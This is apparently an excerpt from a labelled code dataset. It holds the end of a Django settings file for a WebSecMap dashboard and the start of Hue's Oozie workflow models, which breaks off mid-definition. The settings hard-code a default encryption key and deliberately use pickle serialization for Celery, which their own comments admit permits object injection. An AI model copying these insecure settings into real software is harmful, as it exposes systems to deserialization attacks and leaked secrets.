# Encrypted fields
# Note that this key is not stored in the database. As... well if you have the database, you have the key.
FIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')

if not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':
    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '
                     'default key provided. Please create a new key. Instructions are listed here:'
                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',  # sys.stdout
            'formatter': 'color',
        },
    },
    'formatters': {
        'debug': {
            'format': '%(asctime)s\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '
                      '%(funcName)20s() - %(message)s',
        },
        'color': {
            '()': 'colorlog.ColoredFormatter',
            'format': '%(log_color)s%(asctime)s\t%(levelname)-8s - '
                      '%(message)s',
            'datefmt': '%Y-%m-%d %H:%M',
            'log_colors': {
                'DEBUG': 'green',
                'INFO': 'white',
                'WARNING': 'yellow',
                'ERROR': 'red',
                'CRITICAL': 'bold_red',
            },
        }
    },
    'loggers': {
        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.
        # Would you enable it, all logging messages will be logged twice.
        # '': {
        #     'handlers': ['console'],
        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        # },

        # Default Django logging, we expect django to work, and therefore only show INFO messages.
        # It can be smart to sometimes want to see what's going on here, but not all the time.
        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions
        'django': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),
        },

        # We expect to be able to debug websecmap all of the time.
        'dashboard': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        },
    },
}


# settings to get WebSecMap to work:
# Celery 4.0 settings
# Pickle can work, but you need to use certificates to communicate (to verify the right origin)
# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not
# even serialize dicts.
# http://docs.celeryproject.org/en/latest/userguide/configuration.html
CELERY_accept_content = ['pickle', 'yaml']
CELERY_task_serializer = 'pickle'
CELERY_result_serializer = 'pickle'


# Celery config
CELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')
ENABLE_UTC = True

# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# see: https://blog.nelhage.com/2011/03/exploiting-pickle/
# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds
# of directions to get the job done. Intermediate tables to store results could be an option.
CELERY_ACCEPT_CONTENT = ['pickle']
CELERY_TASK_SERIALIZER = 'pickle'
CELERY_RESULT_SERIALIZER = 'pickle'
CELERY_TIMEZONE = 'UTC'

CELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'

CELERY_BROKER_CONNECTION_MAX_RETRIES = 1
CELERY_BROKER_CONNECTION_RETRY = False
CELERY_RESULT_EXPIRES = timedelta(hours=4)

# Use the value of 2 for celery prefetch multiplier. Previous was 1. The
# assumption is that 1 will block a worker thread until the current (rate
# limited) task is completed. When using 2 (or higher) the assumption is that
# celery will drop further rate limited task from the internal worker queue and
# fetch other tasks tasks that could be executed (spooling other rate limited
# tasks through in the process but to no hard except for a slight drop in
# overall throughput/performance). A to high value for the prefetch multiplier
# might result in high priority tasks not being picked up as Celery does not
# seem to do prioritisation in worker queues but only on the broker
# queues. The value of 2 is currently selected because it higher than 1,
# behaviour needs to be observed to decide if raising this results in
# further improvements without impacting the priority feature.
CELERY_WORKER_PREFETCH_MULTIPLIER = 2

# numer of tasks to be executed in parallel by celery
CELERY_WORKER_CONCURRENCY = 10

# Workers will scale up and scale down depending on the number of tasks
# available. To prevent workers from scaling down while still doing work,
# the ACKS_LATE setting is used. This insures that a task is removed from
# the task queue after the task is performed. This might result in some
# issues where tasks that don't finish or crash keep being executed:
# thus for tasks that are not programmed perfectly it will raise a number
# of repeated exceptions which will need to be debugged.
CELERY_ACKS_LATE = True

TOOLS = {
    'organizations': {
        'import_data_dir': '',
    },
}

OUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')
VENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')

if DEBUG:
    # too many sql variables....
    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000


# Compression
# Django-compressor is used to compress css and js files in production
# During development this is disabled as it does not provide any feature there
# Django-compressor configuration defaults take care of this.
# https://django-compressor.readthedocs.io/en/latest/usage/
# which plugins to use to find static files
STATICFILES_FINDERS = (
    # default static files finders
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
    # other finders..
    'compressor.finders.CompressorFinder',
)

COMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']

# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.
# Now using the default, so not explicitly adding that to the settings
# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']

# Brotli compress storage gives some issues.
# This creates the original compressed and a gzipped compressed file.
COMPRESS_STORAGE = (
    'compressor.storage.GzipCompressorFileStorage'
)

# Enable static file (js/css) compression when not running debug
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE
COMPRESS_OFFLINE = not DEBUG
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED
# Enabled when debug is off by default.
/n/n/n",1
104,6641c62beaa1468082e47d82da5ed758d11c7735,"apps/oozie/src/oozie/models2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import re
import time
import uuid

from datetime import datetime, timedelta
from dateutil.parser import parse
from string import Template

from django.utils.encoding import force_unicode
from desktop.lib.json_utils import JSONEncoderForHTML
from django.utils.translation import ugettext as _

from desktop.lib import django_mako
from desktop.models import Document2

from hadoop.fs.hadoopfs import Hdfs
from liboozie.submission2 import Submission
from liboozie.submission2 import create_directories

from oozie.conf import REMOTE_SAMPLE_DIR
from oozie.models import Workflow as OldWorflows
from oozie.utils import utc_datetime_format


LOG = logging.getLogger(__name__)


class Job(object):
  
  def find_all_parameters(self, with_lib_path=True):
    params = self.find_parameters()

    for param in self.parameters:
      params[param['name'].strip()] = param['value']

    return  [{'name': name, 'value': value} for name, value in params.iteritems() if with_lib_path or name != 'oozie.use.system.libpath']  

  @classmethod
  def get_workspace(cls, user):
    return REMOTE_SAMPLE_DIR.get().replace('$USER', user.username).replace('$TIME', str(time.time()))

  @property
  def validated_name(self):
    good_name = []

    for c in self.name[:40]:
      if not good_name:
        if not re.match('[a-zA-Z_]', c):
          c = '_'
      else:
        if not re.match('[\-_a-zA-Z0-9]', c):        
          c = '_'
      good_name.append(c)
      
    return ''.join(good_name)


class Workflow(Job):
  XML_FILE_NAME = 'workflow.xml'
  PROPERTY_APP_PATH = 'oozie.wf.application.path'
  SLA_DEFAULT = [
      {'key': 'enabled', 'value': False},
      {'key': 'nominal-time', 'value': ''},
      {'key': 'should-start', 'value': ''},
      {'key': 'should-end', 'value': ''},
      {'key': 'max-duration', 'value': ''},
      {'key': 'alert-events', 'value': ''},
      {'key': 'alert-contact', 'value': ''},
      {'key': 'notification-msg', 'value': ''},
      {'key': 'upstream-apps', 'value': ''},
  ]
  HUE_ID = 'hue-id-w'
  
  def __init__(self, data=None, document=None, workflow=None):
    self.document = document

    if document is not None:
      self.data = document.data
    elif data is not None:
      self.data = data
    else:
      self.data = json.dumps({
          'layout': [{
              ""size"":12, ""rows"":[
                  {""widgets"":[{""size"":12, ""name"":""Start"", ""id"":""3f107997-04cc-8733-60a9-a4bb62cebffc"", ""widgetType"":""start-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]},
                  {""widgets"":[{""size"":12, ""name"":""End"", ""id"":""33430f0f-ebfa-c3ec-f237-3e77efa03d0a"", ""widgetType"":""end-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]},
                  {""widgets"":[{""size"":12, ""name"":""Kill"", ""id"":""17c9c895-5a16-7443-bb81-f34b30b21548"", ""widgetType"":""kill-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]}
              ],
              ""drops"":[ ""temp""],
              ""klass"":""card card-home card-column span12""
          }],
          'workflow': workflow if workflow is not None else {
              ""id"": None, 
              ""uuid"": None,
              ""name"": ""My Workflow"",
              ""properties"": {
                  ""description"": """",
                  ""job_xml"": """",
                  ""sla_enabled"": False,
                  ""schema_version"": ""uri:oozie:workflow:0.5"",
                  ""sla_workflow_enabled"": False,
                  ""credentials"": [],
                  ""properties"": [],
                  ""sla"": Workflow.SLA_DEFAULT,
                  ""show_arrows"": True,
              },
              ""nodes"":[
                  {""id"":""3f107997-04cc-8733-60a9-a4bb62cebffc"",""name"":""Start"",""type"":""start-widget"",""properties"":{},""children"":[{'to': '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'}]},            
                  {""id"":""33430f0f-ebfa-c3ec-f237-3e77efa03d0a"",""name"":""End"",""type"":""end-widget"",""properties"":{},""children"":[]},
                  {""id"":""17c9c895-5a16-7443-bb81-f34b30b21548"",""name"":""Kill"",""type"":""kill-widget"",""properties"":{'message': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]')},""children"":[]}
              ]
          }
      })
      
  @property
  def id(self):
    return self.document.id  
  
  @property
  def uuid(self):
    return self.document.uuid   
  
  def get_json(self):
    _data = self.get_data()

    return json.dumps(_data)
 
  def get_data(self):
    _data = json.loads(self.data)
    
    if self.document is not None:
      _data['workflow']['id'] = self.document.id
      _data['workflow']['dependencies'] = list(self.document.dependencies.values('uuid',))
    else:
      _data['workflow']['dependencies'] = []

    if 'parameters' not in _data['workflow']['properties']:
      _data['workflow']['properties']['parameters'] = [
          {'name': 'oozie.use.system.libpath', 'value': True},
      ]
    if 'show_arrows' not in _data['workflow']['properties']:
      _data['workflow']['properties']['show_arrows'] = True

    return _data
  
  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}
    tmpl = 'editor/gen2/workflow.xml.mako'

    data = self.get_data()
    nodes = [node for node in self.nodes if node.name != 'End'] + [node for node in self.nodes if node.name == 'End'] # End at the end
    node_mapping = dict([(node.id, node) for node in nodes])
    
    sub_wfs_ids = [node.data['properties']['workflow'] for node in nodes if node.data['type'] == 'subworkflow']
    workflow_mapping = dict([(workflow.uuid, Workflow(document=workflow)) for workflow in Document2.objects.filter(uuid__in=sub_wfs_ids)])

    xml = re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {
              'wf': self,
              'workflow': data['workflow'],
              'nodes': nodes,
              'mapping': mapping,
              'node_mapping': node_mapping,
              'workflow_mapping': workflow_mapping
          }))
    return force_unicode(xml)

  @property
  def name(self):
    _data = self.get_data()
    return _data['workflow']['name']
  
  def update_name(self, name):
    _data = self.get_data()
    _data['workflow']['name'] = name
    self.data = json.dumps(_data)  

  @property      
  def deployment_dir(self):
    _data = self.get_data()
    return _data['workflow']['properties']['deployment_dir']
  
  @property      
  def parameters(self):
    _data = self.get_data()
    return _data['workflow']['properties']['parameters']

  @property      
  def sla_enabled(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla_enabled']

  @property      
  def sla(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla']

  @property      
  def nodes(self):
    _data = self.get_data()
    return [Node(node) for node in _data['workflow']['nodes']]

  def find_parameters(self):
    params = set()

    if self.sla_enabled:
      for param in find_json_parameters(self.sla):
        params.add(param)

    for node in self.nodes:
      params.update(node.find_parameters())

    return dict([(param, '') for param in list(params)])

  def set_workspace(self, user):
    _data = json.loads(self.data)

    _data['workflow']['properties']['deployment_dir'] = Job.get_workspace(user)
    
    self.data = json.dumps(_data)

  def check_workspace(self, fs, user):
    # Create optional root workspace for the first submission    
    root = REMOTE_SAMPLE_DIR.get().rsplit('/', 1)
    if len(root) > 1 and '$' not in root[0]:      
      create_directories(fs, [root[0]])

    Submission(user, self, fs, None, {})._create_dir(self.deployment_dir)
    Submission(user, self, fs, None, {})._create_dir(Hdfs.join(self.deployment_dir, 'lib'))


class Node():
  def __init__(self, data):    
    self.data = data
    
    self._augment_data()
    
  def to_xml(self, mapping=None, node_mapping=None, workflow_mapping=None):
    if mapping is None:
      mapping = {}
    if node_mapping is None:
      node_mapping = {}
    if workflow_mapping is None:
      workflow_mapping = {}

    data = {
      'node': self.data,
      'mapping': mapping,
      'node_mapping': node_mapping,
      'workflow_mapping': workflow_mapping
    }

    return django_mako.render_to_string(self.get_template_name(), data)

  @property      
  def id(self):
    return self.data['id']
  
  @property      
  def name(self):
    return self.data['name']

  @property      
  def sla_enabled(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla_enabled']

  def _augment_data(self):
    self.data['type'] = self.data['type'].replace('-widget', '')
    self.data['uuid'] = self.data['id']
    
    # Action Node
    if 'credentials' not in self.data['properties']:
      self.data['properties']['credentials'] = []     
    if 'prepares' not in self.data['properties']:
      self.data['properties']['prepares'] = []
    if 'job_xml' not in self.data['properties']:
      self.data['properties']['job_xml'] = []      
    if 'properties' not in self.data['properties']:
      self.data['properties']['properties'] = []
    if 'params' not in self.data['properties']:
      self.data['properties']['params'] = []
    if 'files' not in self.data['properties']:
      self.data['properties']['files'] = []
    if 'archives' not in self.data['properties']:
      self.data['properties']['archives'] = []
    if 'sla_enabled' not in self.data['properties']:
      self.data['properties']['sla_enabled'] = False
    if 'sla' not in self.data['properties']:
      self.data['properties']['sla'] = []
    
  def get_template_name(self):
    return 'editor/gen2/workflow-%s.xml.mako' % self.data['type']    

  def find_parameters(self):
    return find_parameters(self)    


class Action(object):
  
  @classmethod
  def get_fields(cls):
    return [(f['name'], f['value']) for f in cls.FIELDS.itervalues()] + [('sla', Workflow.SLA_DEFAULT), ('credentials', [])]


class StartNode(Action):
  TYPE = 'start'
  FIELDS = {}


class EndNode(Action):
  TYPE = 'end'
  FIELDS = {}


class PigAction(Action):
  TYPE = 'pig'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The Pig parameters of the script without -param. e.g. INPUT=${inputDir}'),
          'type': ''
     },
     'arguments': { 
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('The Pig parameters of the script as is. e.g. -param, INPUT=${inputDir}'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path']]


class JavaAction(Action):
  TYPE = 'java'
  FIELDS = {
     'jar_path': { 
          'name': 'jar_path',
          'label': _('Jar name'),
          'value': '',
          'help_text': _('Path to the jar on HDFS.'),
          'type': ''
     },            
     'main_class': { 
          'name': 'main_class',
          'label': _('Main class'),
          'value': '',
          'help_text': _('Java class. e.g. org.apache.hadoop.examples.Grep'),
          'type': 'text'
     },
     'arguments': { 
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('Arguments of the main method. The value of each arg element is considered a single argument '
                         'and they are passed to the main method in the same order.'),
          'type': ''
     },
     'java_opts': { 
          'name': 'java_opts',
          'label': _('Java options'),
          'value': [],
          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b'),
          'type': ''
     },
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': False,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE.title()},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['jar_path'], cls.FIELDS['main_class']]
  
  
class HiveAction(Action):
  TYPE = 'hive'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'hive_xml': { 
          'name': 'hive_xml',
          'label': _('Hive XML'),
          'value': [],
          'help_text': _('Refer to a hive-site.xml renamed hive-conf.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path'], cls.FIELDS['hive_xml']]


class HiveServer2Action(Action):
  TYPE = 'hive2'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},
          'type': ''
     },
     # Common
     'jdbc_url': { 
          'name': 'jdbc_url',
          'label': _('JDBC URL'),
          'value': 'jdbc:hive2://localhost:10000/default',
          'help_text': _('JDBC URL for the Hive Server 2. Beeline will use this to know where to connect to.'),
          'type': ''
     },     
     'password': { 
          'name': 'password',
          'label': _('Password'),
          'value': '',
          'help_text': _('The password element must contain the password of the current user. However, the password is only used if Hive Server 2 is backed by '
                         'something requiring a password (e.g. LDAP); non-secured Hive Server 2 or Kerberized Hive Server 2 don\'t require a password.'),
          'type': ''
     },
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path']]


class SubWorkflowAction(Action):
  TYPE = 'subworkflow'
  FIELDS = {
     'workflow': { 
          'name': 'workflow',
          'label': _('Sub-workflow'),
          'value': None,
          'help_text': _('The sub-workflow application to include. You must own all the sub-workflows'),
          'type': 'workflow'
     },
     'propagate_configuration': { 
          'name': 'propagate_configuration',
          'label': _('Propagate configuration'),
          'value': True,
          'help_text': _('If the workflow job configuration should be propagated to the child workflow.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('Can be used to specify the job properties that are required to run the child workflow job.'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['workflow']] 


class SqoopAction(Action):
  TYPE = 'sqoop'
  FIELDS = {
     'command': { 
          'name': 'command',
          'label': _('Sqoop command'),
          'value': 'import  --connect jdbc:hsqldb:file:db.hsqldb --table TT --target-dir hdfs://localhost:8020/user/foo -m 1',
          'help_text': _('The full %(type)s command. Either put it here or split it by spaces and insert the parts as multiple parameters below.') % {'type': TYPE},
          'type': 'textarea'
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('If no command is specified, split the command by spaces and insert the %(type)s parameters '
                         'here e.g. import, --connect, jdbc:hsqldb:file:db.hsqldb, ...') % {'type': TYPE},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['command']]


class MapReduceAction(Action):
  TYPE = 'mapreduce'
  FIELDS = {
     'jar_path': { 
          'name': 'jar_path',
          'label': _('Jar name'),
          'value': '',
          'help_text': _('Path to the jar on HDFS.'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['jar_path']]


class ShellAction(Action):
  TYPE = 'shell' 
  FIELDS = {
     'shell_command': { 
          'name': 'shell_command',
          'label': _('Shell command'),
          'value': '',
          'help_text': _('Shell command to execute, e.g script.sh'),
          'type': ''
     },            
     'arguments': {
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('One arg, e.g. -l, --help'),
          'type': ''
     },    
     'env_var': { 
          'name': 'env_var',
          'label': _('Environment variables'),
          'value': [],
          'help_text': _('e.g. MAX=10 or PATH=$PATH:mypath'),
          'type': ''
     },         
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': True,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['shell_command']]


class SshAction(Action):
  TYPE = 'ssh' 
  FIELDS = {
     'host': { 
          'name': 'host',
          'label': _('User and Host'),
          'value': 'user@host.com',
          'help_text': _('Where the shell will be executed.'),
          'type': 'text'
     },         
     'ssh_command': { 
          'name': 'ssh_command',
          'label': _('Ssh command'),
          'value': 'ls',
          'help_text': _('The path of the Shell command to execute.'),
          'type': 'textarea'
     },    
     'arguments': {
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('One arg, e.g. -l, --help'),
          'type': ''
     },
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': True,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE},
          'type': ''
     },
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['host'], cls.FIELDS['ssh_command']]


class FsAction(Action):
  TYPE = 'fs' 
  FIELDS = {
     'deletes': { 
          'name': 'deletes',
          'label': _('Delete path'),
          'value': [],
          'help_text': _('Deletes recursively all content.'),
          'type': ''
     },
     'mkdirs': { 
          'name': 'mkdirs',
          'label': _('Create directory'),
          'value': [],
          'help_text': _('Sub directories are created if needed.'),
          'type': ''
     },
     'moves': { 
          'name': 'moves',
          'label': _('Move file or directory'),
          'value': [],
          'help_text': _('Destination.'),
          'type': ''
     },  
     'chmods': { 
          'name': 'chmods',
          'label': _('Change permissions'),
          'value': [],
          'help_text': _('File or directory.'),
          'type': ''
     },
     'touchzs': { 
          'name': 'touchzs',
          'label': _('Create or touch a file'),
          'value': [],
          'help_text': _('Or update its modification date.'),
          'type': ''
     },
     'chgrps': { 
          'name': 'chgrps',
          'label': _('Change the group'),
          'value': [],
          'help_text': _('File or directory.'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['deletes'], cls.FIELDS['mkdirs'], cls.FIELDS['moves'], cls.FIELDS['chmods']]


class EmailAction(Action):
  TYPE = 'email' 
  FIELDS = {
     'to': { 
          'name': 'to',
          'label': _('To addresses'),
          'value': '',
          'help_text': _('Comma-separated values'),
          'type': 'text'
     },         
     'cc': { 
          'name': 'cc',
          'label': _('Cc addresses (optional)'),
          'value': '',
          'help_text': _('Comma-separated values'),
          'type': 'text'
     },    
     'subject': {
          'name': 'subject',
          'label': _('Subject'),
          'value': '',
          'help_text': _('Plain-text'),
          'type': 'text'
     },
     'body': { 
          'name': 'body',
          'label': _('Body'),
          'value': '',
          'help_text': _('Plain-text'),
          'type': 'textarea'
     },
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['to'], cls.FIELDS['subject'], cls.FIELDS['body']]


class StreamingAction(Action):
  TYPE = 'streaming'
  FIELDS = {
     'mapper': { 
          'name': 'mapper',
          'label': _('Mapper'),
          'value': '',
          'help_text': _('The executable/script to be used as mapper.'),
          'type': ''
     },
     'reducer': { 
          'name': 'reducer',
          'label': _('Reducer'),
          'value': '',
          'help_text': _('The executable/script to be used as reducer.'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
